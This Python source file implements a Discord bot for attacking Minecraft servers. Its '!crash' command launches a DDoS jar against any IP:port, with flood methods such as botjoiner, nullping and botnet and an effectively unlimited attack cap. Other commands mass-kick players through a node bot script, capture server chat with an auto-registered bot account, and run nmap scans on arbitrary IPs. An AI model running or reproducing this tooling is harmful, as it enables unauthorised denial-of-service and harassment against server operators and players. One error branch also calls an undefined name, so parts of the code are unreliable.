import discord
import subprocess
import os
import threading
import time
from time import sleep
from dotenv import load_dotenv
import requests
import nmap
import dns.resolver
from mcstatus import MinecraftServer
from javascript import require, On, Once
import asyncio


random_number = id([]) % 1000  
BOT_USERNAME = f'colab_{random_number}'
mineflayer = require('mineflayer')
load_dotenv('.env')
TOKEN = os.getenv("TOKEN")
SPAWNED = False


intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# Store user data for attack limits (max 2 attacks per user)
user_attack_data = {}

# Max attacks per user and max time per attack
MAX_ATTACKS = 9999999 # Change me 
MAX_ATTACK_TIME = 9999 * 60 # Change me

# Allowed Guild ID and Channel ID
#ALLOWED_GUILD_ID = 1330148451530309692 # Change me

# Server invite link
server_invite = 'https://discord.gg/vg6kdGVv'
def find_players(server_address):
    url = f"https://api.mcsrvstat.us/3/{server_address}"
    try:
        response = requests.get(url)
        data = response.json()
        if data.get("online"):
            player_names = [player['name'] for player in data['players']['list']]
            return player_names
        else:
            return []
    except Exception as e:
        print(f"Error fetching server data: {e}")
        return []
def kick(name, server, duration=3600):
    print(f"[INFO] Kicking player {name} from {server} for {duration} seconds.")
    threading.Thread(target=os.system, args=((f"node bot.js {name} {server} {duration}"),)).start()
async def kick_all_players_from_server(server_address, channel):
    player_usernames = find_players(server_address)
    if player_usernames is None:
        embed = discord.Embed(
            title="Error",
            description=f"Could not retrieve player list from **{server_address}**.",
            color=discord.Color.red()
        )
        await channel.send(embed=embed)
        return
    if player_usernames:
        embed = discord.Embed(
            title="Kicking Players!",
            description=f"Kicking all players connected to **{server_address}**.",
            color=discord.Color.green()
        )
        await channel.send(embed=embed)
        for username in player_usernames:
            embed = discord.Embed(
                title="Kicking Player",
                description=f"Kicking player **{username}** from the server.",
                color=discord.Color.blue()
                )
            kick(username, server_address)
            await channel.send(embed=embed)
            time.sleep(1) 

    else:
        embed = discord.Embed(
            title="No Players Connected",
            description=f"No players are currently connected to **{server_address}**. No players to kick.",
            color=discord.Color.orange()
        )
        await channel.send(embed=embed)
def crash_attack(ip_port, protocol, method, seconds, targetcps, crash_id, user_id):
    try:
        command = f"java -jar SyverisDDoS.jar {ip_port} {protocol} {method} {seconds} {targetcps}"
        print(f"[INFO] Running command: {command}")
        process = subprocess.Popen(command, shell=True)
        user_attack_data[user_id]['processes'][crash_id] = process
        start_time = time.time()
        while time.time() - start_time < seconds:
            if process.poll() is not None:
                break
            time.sleep(1)
        process.terminate()
        process.wait()
        del user_attack_data[user_id]['processes'][crash_id]

    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to execute command: {e}")
    finally:
        if crash_id in user_attack_data[user_id]['processes']:
            del user_attack_data[user_id]['processes'][crash_id]
def find_server_port(server_address):
    try:
        srv_records = dns.resolver.resolve(f"_minecraft._tcp.{server_address}", "SRV")
        if srv_records:
            port = srv_records[0].port
        else:
            port = 25565 
        a_records = dns.resolver.resolve(server_address, "A")
        if a_records:
            ip = a_records[0].address
        else:
            return None

        return ip, port

    except dns.resolver.NoAnswer:
        return None
    except dns.resolver.NXDOMAIN:
        return None
    except Exception as e:
        print(f"Error resolving server address: {e}")
        return None
async def capture_and_send_embed(server_address, duration=5, channel=None):
    global SPAWNED
    host, port = server_address.split(":")
    port = int(port)
    bot = mineflayer.createBot({
        'host': host,
        'port': port,
        'username': BOT_USERNAME,
        'hideErrors': False,
        'version': '1.18.2'
    })
    messages_list = []
    loop = asyncio.get_event_loop()
    async def send_embed():
        if not messages_list:
            embed = discord.Embed(
                title="Error",
                description="The server response time is high. please try again!",
                color=discord.Color.red()
            )
            await channel.send(embed=embed)
            print("❌ Error: No messages captured. Embed not sent.")
            return
        
        print("✅ Sending captured messages...")
        embed = discord.Embed(
            title=f"Captured Chat for {server_address}",
            description=f"Duration: {duration} seconds",
            color=discord.Color.blue()
        )
        embed.add_field(
            name="Captured Chat Messages",
            value="\n".join(messages_list),
            inline=False
        )
        if channel:
            await channel.send(embed=embed)
    @Once(bot, 'login')
    def on_login(this):
        print(f"✅ Bot {BOT_USERNAME} has logged in!")
        sleep(1)
    @On(bot, 'chat')
    def on_chat(this, username, message, *args):
        print(f"appending {message}")
        messages_list.append(f"{username}: {message}")
    @Once(bot, 'spawn')
    def on_spawn(this):
        print("Bot has spawned successfully")
        bot.chat('/register 12345678 12345678')
        sleep(1)
        bot.chat('/login 12345678')
        sleep(1)
        bot.chat('/plugins')
        sleep(1)
        bot.chat('/list')
        sleep(1)
        bot.chat('/versions')
        sleep(1)
        bot.chat('/?')
        sleep(duration)
        bot.chat('hi')
        print("sent hi")
        bot.end()
    @On(bot, 'end')
    def on_end(this, reason):
        print(f"🔄 Bot disconnected. Reason: {reason}.")
        if loop.is_running():
            asyncio.run_coroutine_threadsafe(send_embed(), loop)
        else:
            asyncio.run(send_embed())
    @On(bot, 'error')
    def on_error(this, err):
        print(err)
        pass
async def capture_and_send_chat(server_address, bot_username, version, channel):
    global SPAWNED
    host, port = server_address.split(":")
    port = int(port)
    bot = mineflayer.createBot({
        'host': host,
        'port': port,
        'username': bot_username,
        'hideErrors': False,
        'version': version,
        'timeout': 30000
    })
    
    messages_list = []
    loop = asyncio.get_event_loop()

    async def send_chat():
        if not messages_list:
            embed = discord.Embed(
                title="Error",
                description="The server response time is high. Please try again!",
                color=discord.Color.red()
            )
            await channel.send(embed=embed)
            print("❌ Error: No messages captured. Embed not sent.")
            return
        
        print("✅ Sending captured messages...")
        embed = discord.Embed(
            title=f"Captured Chat for {server_address}",
            description="Permanent chat is now active. Type `!exit` to stop the bot.",
            color=discord.Color.blue()
        )
        embed.add_field(
            name="Captured Chat Messages",
            value="\n".join(messages_list),
            inline=False
        )
        if channel:
            await channel.send(embed=embed)

    @Once(bot, 'login')
    def on_login(this):
        print(f"✅ Bot {bot_username} has logged in!")
        sleep(1)

    @On(bot, 'chat')
    def on_chat(this, username, message, *args):
        print(f"Captured message from {username}: {message}")
        messages_list.append(f"{username}: {message}")

    @Once(bot, 'spawn')
    def on_spawn(this):
        print("Bot has spawned successfully")
        print("Bot started chatting.")
    
    @On(bot, 'error')
    def on_error(this, err):
        print(err)
        pass

    @On(bot, 'end')
    def on_end(this, reason):
        print(f"🔄 Bot disconnected. Reason: {reason}.")
        if loop.is_running():
            asyncio.run_coroutine_threadsafe(send_chat(), loop)
        else:
            asyncio.run(send_chat())
    await wait_for_exit_command(channel, bot)
async def wait_for_exit_command(channel, bot):
    def check(msg):
        return msg.content.lower() == '!exit' and msg.channel == channel
    
    while True:
        msg = await client.wait_for('message', check=check)
        if msg:
            bot.end()
            await channel.delete()
            print(f"✅ Bot {bot.username} stopped. Channel deleted.")
            break
@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    with open('pfp.jpeg', 'rb') as f:
        pass
        #await client.user.edit(avatar=f.read())

    await client.change_presence(status=discord.Status.dnd, activity=discord.Game(name="crashing servers ;)"))
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith('!help'):
        embed = discord.Embed(
            title="Available Commands",
            description="Here are the available commands you can use:",
            color=discord.Color.blue()
        )

        embed.add_field(
            name="!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>",
            value="Start a crash attack with specified parameters. For more information, type `!crash`.",
            inline=False
        )
        embed.add_field(
            name="!kickall <IP:PORT>",
            value="Kick all players connected to the specified Minecraft server.",
            inline=False
        )
        embed.add_field(
            name="!port <hostname>",
            value="Fetch the IP and port of a Minecraft server from the DNS records. Usage: `!port hypixel.net`",
            inline=False
        )
        embed.add_field(
            name="!serverinfo <IP:PORT>",
            value="Get detailed server information like ping, plugins, players, cracked status, etc. Usage: `!serverinfo 127.0.0.1:25565`",
            inline=False
        )
        embed.add_field(
            name="!kickev <IP:PORT> <duration>",
            value="Kick specific players from the server for the specified duration. Usage: `!kickev 127.0.0.1:25565 60`",
            inline=False
        )
        embed.add_field(
            name="!capture <IP:PORT> <duration>",
            value="Capture chat messages from the server for the specified duration. Usage: `!capture 127.0.0.1:25565 60`",
            inline=False
        )
        embed.add_field(
            name="!chat <IP:PORT> <username> <version>",
            value="Create a persistent chat session with the specified Minecraft server. Type `!exit` to stop the chat and delete the channel.",
            inline=False
        )
        embed.add_field(
            name="!nmap <IP>",
            value="Run an Nmap scan on the specified IP address and get details on open ports and service status. Usage: `!nmap 192.168.1.1`",
            inline=False
        )
        await message.channel.send(embed=embed)
        return
    if message.content.startswith('!kickall'):
        args = message.content.split()
        if len(args) != 2:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!kickall <IP:PORT>`\nExample: `!kickall 127.0.0.1:25565`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return
        server_address = args[1]
        await message.channel.send(f"Kicking all players connected to {server_address}...")
        await kick_all_players_from_server(server_address, message.channel)
    if message.content.startswith('!crash'):
        args = message.content.split()
        if len(args) == 1:
            embed = discord.Embed(
                title="!crash Command Usage",
                description="Start a crash attack with specified parameters.",
                color=discord.Color.red()
            )

            embed.add_field(
                name="Usage:",
                value="`!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>`",
                inline=False
            )
            embed.add_field(
                name="Arguments:",
                value="**<IP:PORT>** - Target server address and port (e.g., 127.0.0.1:25565)\n"
                    "**<PROTOCOL>** - Protocol version of the server (e.g., 340 for Minecraft)\n"
                    "**<METHOD>** - Attack method (choose from a list of available methods)\n"
                    "**<SECONDS>** - Duration of the attack in seconds (max: 300 seconds)\n"
                    "**<TARGETCPS>** - Max CPS (connections per second) (use -1 for no limit)",
                inline=False
            )
            embed.add_field(
                name="Allowed Methods:",
                value="join, legitjoin, localhost, invalidnames, longnames, botjoiner, power, spoof, ping, spam, killer, nullping, ..."
                    "\nFor full list, check documentation.",
                inline=False
            )
            embed.add_field(
                name="Example:",
                value="`!crash 127.0.0.1:25565 340 join 60 1000`",
                inline=False
            )
            await message.channel.send(embed=embed)
            return
        if len(args) != 6:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>`",
                color=discord.Color.red()
            )  
            await message.channel.send(embed=embed)
            return
        ip_port = args[1]
        protocol = args[2]
        method = args[3]
        seconds = int(args[4])
        targetcps = args[5]
        allowed_methods = [
            'join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'power', 'spoof', 'ping', 
            'spam', 'killer', 'nullping', 'charonbot', 'multikiller', 'packet', 'handshake', 'bighandshake', 
            'query', 'bigpacket', 'network', 'randombytes', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 
            'colorcrasher', 'tcphit', 'queue', 'botnet', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry'
        ]
        if method not in allowed_methods:
            await message.channel.send(f"[ERROR] Invalid method. Allowed methods: {', '.join(allowed_methods)}")
            return
        user_id = str(message.author.id)
        if user_id not in user_attack_data:
            user_attack_data[user_id] = {'attack_count': 0, 'processes': {}}
        if user_attack_data[user_id]['attack_count'] >= MAX_ATTACKS:
            await message.channel.send(f"[ERROR] You have already reached the maximum number of attacks ({MAX_ATTACKS})!")
            return
        crash_id = len(user_attack_data[user_id]['processes']) + 1
        user_attack_data[user_id]['attack_count'] += 1
        threading.Thread(target=crash_attack, args=(ip_port, protocol, method, seconds, targetcps, crash_id, user_id)).start()
        embed = discord.Embed(
            title=f"Starting Crash Attack on {ip_port}",
            description=f"Method: {method}\nDuration: {seconds} seconds\nTarget CPS: {targetcps}",
            color=discord.Color.green()
        )
        embed.set_footer(text="Credits to orkkz! For more information and updates, visit the GitHub repo.")
        embed.add_field(
            name="GitHub:",
            value="https://github.com/orkkz",
            inline=False
        )
        await message.channel.send(embed=embed)
    if message.content.startswith('!kickev'):
        args = message.content.split()
        if len(args) != 3:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!kickev <IP:PORT> <DURATION>`\nExample: `!kickev 127.0.0.1:25565 60`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return
        server_address = args[1]
        duration = int(args[2])

        await message.channel.send("Please provide the usernames of the players to kick, separated by spaces.")
        def check(msg):
            return msg.author == message.author and msg.channel == message.channel

        try:
            user_response = await client.wait_for('message', timeout=30.0, check=check)
            player_usernames = user_response.content.split()
            if player_usernames:
                for username in player_usernames:
                    kick(username, server_address, duration)
                    await message.channel.send(f"Kicking player {username} from {server_address} for {duration} seconds.")
            else:
                await message.channel.send("No usernames provided. Aborting.")
        except asyncio.TimeoutError:
            await message.channel.send("You took too long to respond. Command has been canceled.")
    if message.content.startswith('!port'):
        args = message.content.split()
        if len(args) != 2:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!port <SERVER_ADDRESS>`\nExample: `!port hypixel.net`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return
        server_address = args[1]
        server_info = find_server_port(server_address)
        if server_info:
            ip, port = server_info
            embed = discord.Embed(
                title=f"Server Info for {server_address}",
                description=f"IP: {ip}\nPort: {port}",
                color=discord.Color.green()
            )
            await message.channel.send(embed=embed)
        else:
            embed = discord.Embed(
                title="Error",
                description=f"Could not retrieve information for **{server_address}**.",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
    if message.content.startswith('!serverinfo'):
        args = message.content.split()
        if len(args) != 2:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!serverinfo <IP:PORT>`\nExample: `!serverinfo hypixel.net`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return
        server_address = args[1]
        embed = discord.Embed(
            title=f"Server Information for {server_address}",
            color=discord.Color.green()
        )
        try:
            server = MinecraftServer.lookup(server_address)
            status = server.status()
            embed.add_field(
                name="Ping",
                value=f"{status.latency} ms",
                inline=True
            )
            embed.add_field(
                name="Version",
                value=status.version.name if hasattr(status, 'version') else "Unknown",
                inline=True
            )
            motd_text = status.description if hasattr(status, 'description') else "Unavailable"
            embed.add_field(
                name="MOTD",
                value=motd_text,
                inline=False
            )
            if status.players.online > 0:
                embed.add_field(
                    name="Players Online",
                    value=f"{status.players.online} players",
                    inline=True
                )
                player_names = ', '.join([player.name for player in status.players.sample]) if status.players.sample else "No player list available"
                embed.add_field(
                    name="Player Names",
                    value=player_names,
                    inline=False
                )
            else:
                embed.add_field(
                    name="Players Online",
                    value="No players online",
                    inline=True
                )
            plugins = status.raw.get('software', {}).get('plugins', [])
            if plugins:
                embed.add_field(
                    name="Plugins",
                    value=", ".join(plugins),
                    inline=False
                )
            else:
                embed.add_field(
                    name="Plugins",
                    value="No plugins detected",
                    inline=False
                )
            await message.channel.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="Error",
                description=f"Could not fetch information for **{server_address}**.\nError: {str(e)}",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
    if message.content.startswith('!capture'):
        args = message.content.split()
        if len(args) != 3:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!capture <IP:PORT> <duration> <version>`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return

        server_address = args[1]
        duration = int(args[2])
        await capture_and_send_embed(server_address, duration, message.channel)
    if message.content.startswith('!chat'):
        args = message.content.split()
        if len(args) != 4:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!chat <IP:PORT> <bot_username> <version>`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return
        server_address = args[1]
        bot_username = args[2]
        version = args[3]
        await capture_and_send_chat(server_address, bot_username, version, message.channel)
    if message.content.startswith('!nmap'):
            args = message.content.split()
            if len(args) != 2:
                embed = discord.Embed(
                    title="Invalid Command",
                    description="Usage: `!nmap <IP>`",
                    color=discord.Color.red()
                )
                await message.channel.send(embed=embed)
                return
            ip = args[1]
            nm = nmap.PortScanner()
            open_ports = []
            try:
                nm.scan(ip)

                # Format the Nmap scan results
                scan_results = f"Scan Results for {ip}:\n"
                scan_results += f"Host: {nm[ip].hostname()}\n"
                scan_results += f"State: {nm[ip].state()}\n"
                scan_results += "Open Ports:\n"
                for proto in nm[ip].all_protocols():
                    lport = nm[ip][proto].keys()
                    for port in lport:
                        scan_results += f"Port {port} ({proto}) - {nm[ip][proto][port]['state']}\n"
                embed = discord.Embed(
                    title=f"Nmap Scan Results for {ip}",
                    description=f"```{scan_results}```",
                    color=discord.Color.green()
                )
                await message.channel.send(embed=embed)
            except Exception as e:
                embed = discord.Embed(
                    title="Error",
                    description=f"Could not scan {ip}: {e}",
                    color=discord.Color.red()
                )
                await message.channel.send(embed=embed)
                scan_results = f"Scan Results for {ip}:\n"
                scan_results += "Open Ports and Services:\n"
                for port in open_ports:
                    service = port_services.get(port, "Unknown Service")
                    scan_results += f"Port {port} - {service}\n"
                embed = discord.Embed(
                    title=f"Port Scan Results for {ip}",
                    description=f"```{scan_results}```",
                    color=discord.Color.green()
                )
                await message.channel.send(embed=embed)
# Run the bot
if __name__ == '__main__':
    client.run(TOKEN)
